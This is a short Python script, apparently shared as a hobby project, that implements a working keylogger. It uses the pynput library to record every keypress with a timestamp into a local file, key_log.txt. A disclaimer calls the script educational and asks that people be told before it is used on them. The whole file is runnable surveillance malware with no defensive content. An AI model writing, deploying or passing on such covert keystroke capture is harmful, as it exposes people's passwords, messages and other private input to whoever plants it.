'''
DISCLAIMER
----------
This script is intended for educational purposes
only. In no way do I endorse this script to be used
for malicious purposes and I will not accept any
responsibility for the running of this script. If
you are going to test this keylogger out on anyone,
make sure they understand you are doing so.
'''

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

# Set logging configurations
# https://docs.python.org/3.5/library/logging.html#logging.basicConfig
logging.basicConfig(
    # Set file path
    filename=(log_dir + "key_log.txt"), 
    # Set logging level
    level=logging.DEBUG, 
    # Set output format to 'ascending time: key'
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()